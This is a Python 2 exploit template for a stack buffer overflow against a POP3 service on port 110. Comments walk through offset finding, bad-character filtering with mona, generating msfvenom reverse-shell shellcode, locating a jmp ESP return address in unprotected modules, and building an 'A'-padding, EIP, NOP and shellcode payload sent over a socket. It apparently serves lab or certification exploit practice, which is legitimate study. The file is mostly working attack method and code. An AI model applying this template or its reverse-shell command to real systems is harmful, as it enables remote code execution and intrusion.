#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import socket
# for pack
import struct

from time import *

# 1. Re-create BOF with Pattern
# !mona pc 3000
# metasploit-framework/tools/exploit/pattern_create.rb -l 2000
#     (https://github.com/jbertman/pattern_tools)
PATTERN = "13371337"

# 2. Determine offset to control EIP
# (Manually or using !mona findmsp / !mona suggest)
# (findmsp only works in conjunction with pattern_create.rb)
# CHANGE ME
OFFSET = 1212

# 3. Space: Determine space for shellcode, make size constant
# Might need 360 - 450 bytes for shellcode
# CHANGE ME
TOTALSIZE = 1515

# 4. Filter bad chars
# Run immunity as admin!
# SET WORKING DIR: `!mona config -set workingfolder c:\monalogs\%p_%i`
##
# Create array with all possible chars except the known one: !mona bytearray -cpb "\x00"
# Open bytearray.txt and paste it into the exploit
# Run !mona compare -f C:\<path to>\bytearray.bin -a <start of pattern on stack, e.g. 00AFFD44>
# Add bad char to your notes
# Create new pattern, e.g. !mona bytearray -cpb "\x00\x0a"
# In case of missing space: !mona bytearray -cpb "\x00\x20..\xff"
# 	e.g only creates values from 01..1f
# 	Then continue with !mona bytearray -cpb "\x00..\x1f\x40..\xff"
# 	Don't forget \x00 as bad character!

BADCHARS = ""
BADCHARS += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
BADCHARS += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
BADCHARS += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
BADCHARS += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
BADCHARS += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
BADCHARS += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
BADCHARS += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
BADCHARS += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

BAD = "\x00"


# 5. Create shellcode, e.g.
# For shell:
# msfvenom -f python --var-name _shellcode_ -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f py -b <BAD CHARS>
# For testing:
# msfvenom -p windows/exec -b <BAD CHARS> -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread

# 6. Add padding with NOPs before the shellcode begins (\x90) - e.g. 8 - 20 bytes

# 7. Determine return address
# In case we are in control of ESP: jmp ESP needed
# Find one in the binary or in a DLL
# Value to search for: https://defuse.ca/online-x86-assembler.htm#disassembly
# jmp ESP = FF E4 --> search for \xff\xe4
# Find a module to search in: !mona modules
#	Has to be without Rebase, (SafeSEH), ASLR and NXCompat
# !mona find -s "\xff\xe4" -m <module>.dll
# Verify with disassembly
# Or quicker: !mona jmp -r esp -cpb "<Bad Chars>"

# 8. Assemble payload
# in case "A" (0x41) is not a bad char:
# "A" * <offset> + Return address with reversed endianness + [Padding (NOPs) or SUB_ESP] + Shellcode

# 9. EDIT THE CODE TO SEND `PAYLOAD`!

# 10. Not working?
# 0. Need x86/x64 payload / encoder?
# 1. Did you re-create the payload in order to connect back to your lab IP instead of localhost?
# 2. Try calc.exe with thread exitfunc:
#   msfvenom -p windows/exec -b '<Bad Chars>' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
# 3. Debug with \xCC shellcode

# For step 8: Either create nop sled or arrange ESP
NOP = "\x90"
# From metasploit-framework/tools/exploit/metasm_shell.rb
# SUB ESP 10 (Value has to be divisible by 4 -- 0x10 == 16)
SUB_ESP = "\x83\xec\x10"

# From 0x78563412 to 0x12345678
EIP = struct.pack("<I", 0x78563412)
# INT 3 interrupt
SHELLCODE = "\xCC\xCC\xCC\xCC"

PAYLOAD = ""
PAYLOAD += "A" * OFFSET
PAYLOAD += EIP  # (Overwrite SRP)

# Use one or the other
# PAYLOAD += SUB_ESP
PAYLOAD += NOP * 12  # For encoded payloads

PAYLOAD += SHELLCODE
PAYLOAD += NOP * (TOTALSIZE - len(PAYLOAD))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(('127.0.0.1', 110))
    print "\nHacking..."

    # receive banner
    data = s.recv(1024)
    print data

    s.send('USER test' + '\r\n')
    data = s.recv(1024)
    print data

    s.send('PASS ' + PATTERN + '\r\n')
    data = s.recv(1024)
    print data

    s.close()
    print "\nDone!"
except Exception as e:
    print e
    print "Could not connect."
